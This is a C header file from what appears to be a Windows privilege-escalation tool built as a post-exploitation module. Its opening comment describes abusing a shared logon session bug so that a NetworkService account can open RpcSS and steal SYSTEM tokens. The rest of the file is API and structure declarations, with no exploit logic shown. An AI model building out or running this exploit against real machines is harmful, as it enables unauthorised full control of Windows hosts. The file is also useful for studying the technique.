/*!
 *
 * Network Service Exploit: Abuses the shared logon
 * session ID bug documented by James Forshaw that
 * permits a NetworkService account to acquire a
 * session ID matching RpcSS service, allowing it to
 * open the process with ALL_ACCESS handle.
 *
 * Using this access, the attacker may be able to
 * enumerate any active handles open within the 
 * process, and steal any SYSTEM tokens available to
 * it.
 *
 * For the bug to work properly, the attacker must
 * create a named pipe server handle and access it
 * from the local NPFS redirection using localhost 
 * as the server name.
 *
!*/
#pragma once

#define ProcessHandleInformation 51
#define NtCurrentProcess() ((HANDLE)-1)
#define NtCurrentThread()  ((HANDLE)-2)

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
	HANDLE HandleValue;
	ULONGLONG HandleCount;
	ULONGLONG PointerCount;
	ACCESS_MASK GrantedAccess;
	ULONG ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO,
*PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
	ULONGLONG NumberOfHandles;
	ULONGLONG Reserved;
	PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION,
*PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct _C_OBJECT_TYPE_INFORMATION {
	UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	BOOLEAN TypeIndex;
	CHAR ReservedByte;
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} C_OBJECT_TYPE_INFORMATION,
*C_POBJECT_TYPE_INFORMATION;

DECLSPEC_IMPORT
LPVOID
WINAPI
KERNEL32$LocalAlloc(
	IN UINT uFlags,
	IN SIZE_T uBytes
	);

DECLSPEC_IMPORT
LPVOID
WINAPI
KERNEL32$LocalFree(
	IN LPVOID pMem
	);

DECLSPEC_IMPORT
HANDLE
WINAPI
KERNEL32$OpenProcess(
	IN DWORD dwDesiredAccess,
	IN BOOL bInheritHandle,
	IN DWORD dwProcessId
	);

DECLSPEC_IMPORT
HANDLE
WINAPI
KERNEL32$CreateNamedPipeA(
	IN LPCSTR lpName,
	IN DWORD dwOpenMode,
	IN DWORD dwPipeMode,
	IN DWORD nMaxInstances,
	IN DWORD nOutBufferSize,
	IN DWORD nInBufferSize,
	IN DWORD nDefaultTimeOut,
	IN LPSECURITY_ATTRIBUTES lpSecurityAttributes
	);

DECLSPEC_IMPORT
BOOL
WINAPI
KERNEL32$ConnectNamedPipe(
	IN HANDLE hNamedPipe,
	IN LPOVERLAPPED lpOverlapped
	);

DECLSPEC_IMPORT
BOOL
WINAPI
ADVAPI32$ImpersonateNamedPipeClient(
	IN HANDLE hNamedPipe
	);

DECLSPEC_IMPORT
BOOL
WINAPI
KERNEL32$DisconnectNamedPipe(
	IN HANDLE hNamedPipe
	);

DECLSPEC_IMPORT
BOOL
WINAPI
KERNEL32$CloseHandle(
	IN HANDLE hObject
	);

DECLSPEC_IMPORT
BOOL
WINAPI
KERNEL32$GetLastError();

DECLSPEC_IMPORT
HANDLE
WINAPI
KERNEL32$CreateFileA(
	IN LPCSTR lpFileName,
	IN DWORD dwDesiredAccess,
	IN DWORD dwShareMode,
	IN LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	IN DWORD dwCreationDisposition,
	IN DWORD dwFlagsAndAttributes,
	IN HANDLE hTemplateFile
	);

DECLSPEC_IMPORT
BOOL
WINAPI
KERNEL32$DuplicateHandle(
	IN HANDLE hSourceProcessHandle,
	IN HANDLE hSourceHandle,
	IN HANDLE hTargetProcessHandle,
	OUT LPHANDLE lpTargetHandle,
	IN DWORD dwDesiredAccess,
	IN BOOL bInheritHandle,
	IN DWORD dwOptions
	);

DECLSPEC_IMPORT
SC_HANDLE
WINAPI
ADVAPI32$OpenSCManagerA(
	IN LPCSTR lpMachineName,
	IN LPCSTR lpDatabaseName,
	IN DWORD dwDesiredAccess
	);

DECLSPEC_IMPORT
SC_HANDLE
WINAPI
ADVAPI32$OpenServiceA(
	IN SC_HANDLE hSCManager,
	IN LPCSTR lpServiceName,
	IN DWORD dwDesiredAccess
	);

DECLSPEC_IMPORT
BOOL
WINAPI
ADVAPI32$QueryServiceStatusEx(
	IN SC_HANDLE hService,
	IN SC_STATUS_TYPE InfoLevel,
	OUT LPBYTE lpBuffer,
	IN DWORD cbBufSize,
	OUT PDWORD pcbBytesNeeded
	);

DECLSPEC_IMPORT
BOOL
WINAPI
ADVAPI32$CloseServiceHandle(
	IN SC_HANDLE hSCObject
	);

DECLSPEC_IMPORT
BOOL
WINAPI
ADVAPI32$OpenProcessToken(
	IN HANDLE ProcessHandle,
	IN DWORD DesiredAccess,
	IN PHANDLE TokenHandle
	);

DECLSPEC_IMPORT
BOOL
WINAPI
ADVAPI32$GetTokenInformation(
	IN HANDLE TokenHandle,
	IN TOKEN_INFORMATION_CLASS TokenInformationClass,
	OUT LPVOID TokenInformation,
	IN DWORD TokenInformationLength,
	OUT PDWORD ReturnLength
	);

DECLSPEC_IMPORT
NTSYSAPI
NTSTATUS
NTAPI
NTDLL$NtQueryObject(
	IN HANDLE ObjHandle,
	IN ULONG ObjectInformationClass,
	OUT PVOID ObjectInformation,
	IN ULONG ObjectInformationLength,
	OUT PULONG ReturnLength
	);

DECLSPEC_IMPORT
NTSYSAPI
NTSTATUS
NTAPI
NTDLL$NtQueryInformationProcess(
	IN HANDLE ProcessHandle,
	IN ULONG ProcessInfoClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength
	);
